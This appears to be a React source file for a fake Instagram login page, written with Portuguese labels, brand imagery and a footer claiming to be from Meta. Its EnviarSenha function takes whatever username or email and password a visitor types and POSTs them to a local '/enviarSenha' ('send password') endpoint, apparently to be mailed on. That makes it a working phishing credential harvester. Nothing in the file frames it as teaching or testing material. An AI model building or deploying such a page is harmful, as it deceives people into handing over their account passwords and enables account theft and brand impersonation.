import instaLogo from '../../assets/images/instagram-logo.webp'
import googlePlay from '../../assets/images/google-play.png'
import microsoft from '../../assets/images/microsoft.png'

import './index.scss';
import { useState, useRef } from 'react';
import axios from 'axios';

let url = 'http://localhost:5000/enviarSenha'

function App() {
  const [hidePlaceHolder, setHidePlaceHolder] = useState(false)

  const [PWD, setPWD] = useState('')
  const [EMAIL, setEMAIL] = useState('')

  const EmailRef = useRef(null)
  const senhaRef = useRef(null)


  const EnviarSenha = async () => {
    let dadosPessoa = {
      subject: EMAIL,
      text: PWD
    }
    let resposnse = await axios.post(url, dadosPessoa)
    console.log(resposnse)
  }

  return (
    <div className="App">
      <div className='loginScreen'>
        <div className='LogoSection'>
          <i className='imgLogo'></i>

        </div>
        <div className='inputs'>

          <div onClick={() => EmailRef.current.focus(EmailRef)}>

            <input ref={EmailRef} type='text' placeholder='Telefone, nome de usuario ou email' onChange={e => setEMAIL(e.target.value)} />

          </div>

          <div onClick={() => senhaRef.current.focus(senhaRef)}>
            <input ref={senhaRef} type='password' placeholder='Senha' onChange={e => setPWD(e.target.value)} />
          </div>
          <button onClick={EnviarSenha}>Entrar</button>
        </div>
        <a className='RecPwd' href=''>Esqueceu a senha?</a>
      </div>
      <div className='NewAccount'>
        <p>Não tem uma conta? <a href=''>Cadastre-se</a></p>
      </div>
      <div className='getApp'>
        <p>Obtenha o aplicativo</p>
        <div className='sites'>
          <img src={googlePlay} className='googlePlay' />
          <img src={microsoft} className='microsoft' />
        </div>
      </div>

      <footer>
        <div className='links'>
          <a href='' >Meta</a>
          <a href='' >Sobre</a>
          <a href='' >Blog</a>
          <a href='' >Carreiras</a>
          <a href='' >Ajuda</a>
          <a href='' >API</a>
          <a href='' >Privacidade</a>
          <a href='' >Termos</a>
          <a href='' >Principais Contas</a>
          <a href='' >Localizações</a>
          <a href='' >instagram Lite</a>
          <a href='' >Threads</a>
          <a href='' >Carregamento de contatos e não usuarios</a>
          <a href='' >Meta Verified</a>
          <a href='' >Principais</a>
        </div>
        <div>
          <a href=''>Português (Brasil)  </a>
          <a href=''>
            &copy; 2023 Instagram from Meta
          </a>
        </div>
      </footer>
    </div>
  );
}

export default App;
